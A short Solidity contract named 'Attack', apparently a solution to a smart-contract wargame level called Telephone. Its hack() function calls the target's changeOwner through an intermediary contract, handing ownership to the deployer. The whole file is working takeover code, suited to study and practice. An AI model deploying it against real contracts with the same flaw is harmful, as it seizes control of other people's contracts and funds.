// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    ITelephone private immutable telephone;
    address private immutable newOwner;

    constructor(address contractAddress) {
        telephone = ITelephone(contractAddress);
        newOwner = msg.sender;
    }

    function hack() public {
        telephone.changeOwner(newOwner);
    }
}
